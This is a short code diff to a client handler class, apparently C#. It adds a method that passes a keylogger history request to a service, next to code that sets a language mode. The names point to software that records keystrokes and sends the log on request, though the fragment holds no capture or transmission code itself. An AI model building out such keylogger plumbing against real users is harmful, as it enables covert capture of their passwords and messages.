@@ -30,6 +30,11 @@ namespace Client.Handlers
             _service.SetLanguageMode(toggle.Vietnamese);
             return Task.CompletedTask;
         }
+
+        public Task HandleHistoryRequestAsync(KeyLoggerHistoryRequest request)
+        {
+            return _service.HandleHistoryRequestAsync(request);
+        }
     }
 }
 
